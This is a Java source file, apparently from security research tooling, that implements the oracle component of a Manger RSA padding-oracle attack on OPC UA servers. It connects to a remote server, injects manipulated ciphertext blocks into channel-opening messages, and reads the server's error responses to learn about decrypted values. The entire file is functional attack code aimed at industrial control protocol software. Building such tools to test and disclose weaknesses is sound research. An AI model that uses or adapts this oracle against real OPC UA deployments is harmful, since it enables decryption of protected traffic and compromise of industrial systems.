package attacks.manger.oracle;

import attacks.CipherTextHelper;
import opcua.context.Context;
import opcua.message.ErrorMessage;
import opcua.message.HelloMessage;
import opcua.message.Message;
import opcua.message.parts.MessageType;
import opcua.util.MessageReceiver;
import opcua.util.MessageSender;
import org.bouncycastle.operator.ContentSigner;
import org.bouncycastle.util.Arrays;
import transport.tcp.ClientTcpConnection;

import java.io.IOException;
import java.security.interfaces.RSAPublicKey;
import java.util.function.Predicate;

public class DistinguishableErrorOracle extends Oracle {

    private Context context;
    private Predicate<ErrorMessage> lessThanBPredicate;
    private HelloMessage helloMessage;
    private byte[] validCipherText;
    private int blockNumber;
    private int blockOffset;
    private int cipherBlockSize;


    public DistinguishableErrorOracle(Context context, Predicate<ErrorMessage> lessThanBPredicate, byte[] validCipherText, int blockNumber) throws IOException {
        this.context = context;
        this.lessThanBPredicate = lessThanBPredicate;
        this.helloMessage = new HelloMessage(0, 8192, 8192, 8192, 256, context.getEndpointUrl());
        this.validCipherText = validCipherText;
        RSAPublicKey publicKey = (RSAPublicKey) context.getRemoteCertificate().getPublicKey();
        this.blockNumber = blockNumber;
        this.blockOffset = CipherTextHelper.getOpnBlockOffset(validCipherText, publicKey);
        this.cipherBlockSize = publicKey.getModulus().bitLength() / 8;
    }


    @Override
    public boolean checkValidity(byte[] message) throws OracleException {
        if(message.length != cipherBlockSize) {
            throw new OracleException("Invalid block size");
        }

        ClientTcpConnection connection = new ClientTcpConnection(context.getRemoteHostname(), context.getRemotePort(), 3000);
        context.setConnection(connection);
        try {
            connection.initialize();
            MessageSender.sendMessage(helloMessage, context);
            Message ack = MessageReceiver.receiveMessage(context);
            if(ack == null || ack.getMessageType() != MessageType.ACK) {
                throw new OracleException("Unable to establish TCP connection");
            }

            //Send manipulated cipher text
            CipherTextHelper.insertCipherBlock(validCipherText, message, blockOffset, cipherBlockSize, blockNumber);
            MessageSender.sendBytes(validCipherText, context);
            Message response = MessageReceiver.receiveMessage(context);

            this.incrementQueryCount();

            if(response == null || response.getMessageType() != MessageType.ERR) {
                //We "guessed" a valid
                return true;        //TODO!!!!
            }


            System.out.println((ErrorMessage)response);

            //Check result
            return lessThanBPredicate.test((ErrorMessage)response);

        }
        catch (IOException e) {
            throw new OracleException(e);
        }
    }

    public byte[] getCipherBlock() {
        return CipherTextHelper.getCipherBlock(validCipherText, blockOffset, cipherBlockSize, blockNumber);
    }
}
